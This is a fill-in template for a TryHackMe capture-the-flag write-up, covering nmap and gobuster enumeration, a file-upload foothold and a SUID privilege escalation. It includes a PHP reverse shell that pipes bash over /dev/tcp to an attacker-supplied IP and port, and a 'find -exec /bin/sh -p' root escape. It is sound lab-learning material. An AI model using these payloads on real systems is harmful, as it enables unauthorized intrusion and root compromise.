@@ -1,0 +1,162 @@
+# TryHackMe Write-up: [Room Name]
+
+---
+
+### **Room Details**
+* **Name:** [Name of the TryHackMe Room]
+* **URL:** [Link to the TryHackMe Room]
+* **Difficulty:** [Easy, Medium, Hard, etc.]
+* **Machine IP:** [IP Address of the Target Machine]
+
+---
+
+## Synopsis
+
+A brief, high-level overview of the challenge. What was the main theme or technology focus of this CTF? What were the key steps to compromise the machine?
+
+*(Example: This challenge involved exploiting a web application vulnerability to gain an initial foothold, followed by escalating privileges by taking advantage of misconfigured SUID binaries on the system.)*
+
+---
+
+## 1. Enumeration & Scanning
+
+This is the initial information-gathering phase. Detail the steps you took to understand the target system.
+
+### Nmap Scan
+
+I started by running an Nmap scan to identify open ports and services running on the target machine.
+
+**Command:**
+```bash
+nmap -sC -sV -oN nmap_results.txt [IP Address]
+```
+
+* `-sC`: Run default Nmap scripts.
+* `-sV`: Enumerate service versions.
+* `-oN`: Save the output to a file.
+
+**Results:**
+```
+PORT   STATE SERVICE VERSION
+---    ----- ------- -------
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+...
+[Add other ports and services found]
+```
+
+### Web Enumeration
+
+Since port 80 was open, I explored the web server.
+
+* **Initial Browsing:** Visiting `http://[IP Address]` revealed [describe the initial web page].
+* **Directory Brute-forcing:** I used `gobuster` (or `dirb`, `ffuf`) to find hidden directories and files.
+
+    **Command:**
+    ```bash
+    gobuster dir -u http://[IP Address] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+    ```
+
+    **Interesting Findings:**
+    * `/login.php`: A login page.
+    * `/uploads`: A directory with file upload functionality.
+    * `/robots.txt`: Found a disallowed entry: `/admin_panel`.
+
+---
+
+## 2. Gaining Initial Access (Foothold)
+
+Describe the process of getting your first shell on the machine (user-level access).
+
+### Vulnerability Exploited
+
+[Describe the specific vulnerability you found. For example: SQL Injection, Local File Inclusion (LFI), Unrestricted File Upload, etc.]
+
+### Exploitation Steps
+
+1.  **[Step 1]:** I navigated to the `/uploads` page and discovered I could upload files.
+2.  **[Step 2]:** I crafted a PHP reverse shell payload.
+    ```php
+    <?php
+    // PHP reverse shell payload
+    exec("/bin/bash -c 'bash -i >& /dev/tcp/[Your-IP]/[Your-Port] 0>&1'");
+    ?>
+    ```
+3.  **[Step 3]:** I started a `netcat` listener on my machine to catch the connection.
+    ```bash
+    nc -lnvp 4444
+    ```
+4.  **[Step 4]:** I uploaded the PHP shell and navigated to `http://[IP Address]/uploads/shell.php` to trigger it. This gave me a reverse shell as the `www-data` user.
+
+### Finding the User Flag
+
+After gaining access, I found the user flag.
+
+**Command:**
+```bash
+find / -name user.txt 2>/dev/null
+cat /home/[username]/user.txt
+```
+
+**User Flag:** `[Paste the user.txt flag here]`
+
+---
+
+## 3. Privilege Escalation
+
+Detail the steps you took to escalate your privileges from a low-level user to `root`.
+
+### Enumerating the System for Vectors
+
+Once on the system, I performed internal enumeration to find a path to root.
+
+* **Manual Enumeration:** I checked `sudo -l`, looked for SUID/GUID files, checked `cron` jobs, and looked for sensitive files or credentials.
+    ```bash
+    # Check SUID files
+    find / -perm -u=s -type f 2>/dev/null
+    ```
+* **Automated Enumeration:** I uploaded and ran an enumeration script like `linpeas.sh` or `lse.sh`.
+
+### Vulnerability Exploited
+
+[Describe the privilege escalation vector. For example: SUID binary exploit, kernel exploit, insecure cron job, password in a config file, etc.]
+
+### Exploitation Steps
+
+1.  **[Step 1]:** The `find` command revealed that `/usr/bin/find` itself had the SUID bit set.
+2.  **[Step 2]:** I leveraged this misconfiguration to execute commands as `root`. GTFOBins is a great resource for this.
+3.  **[Step 3]:** I used the following command to spawn a `root` shell:
+    ```bash
+    /usr/bin/find . -exec /bin/sh -p \; -quit
+    ```
+4.  **[Step 4]:** I verified my identity with `whoami`, which returned `root`.
+
+### Finding the Root Flag
+
+Now with `root` access, I could retrieve the final flag.
+
+**Command:**
+```bash
+cat /root/root.txt
+```
+
+**Root Flag:** `[Paste the root.txt flag here]`
+
+---
+
+## Conclusion & Key Takeaways
+
+Summarize the CTF and reflect on what you learned.
+
+* **What was the critical vulnerability?** The path to root relied on [e.g., a misconfigured SUID binary].
+* **What did you learn?** This room was a great reminder to always check file permissions and to never underestimate the power of basic enumeration.
+* **How could this be prevented?** The system administrator should have [e.g., removed the SUID bit from the `find` binary using `chmod u-s /usr/bin/find`].
+
+---
+
+## Tools Used
+
+* **Nmap:** Port scanning and service enumeration.
+* **GoBuster:** Web directory brute-forcing.
+* **Netcat:** Setting up a listener for the reverse shell.
+* **[Add any other tools you used]**
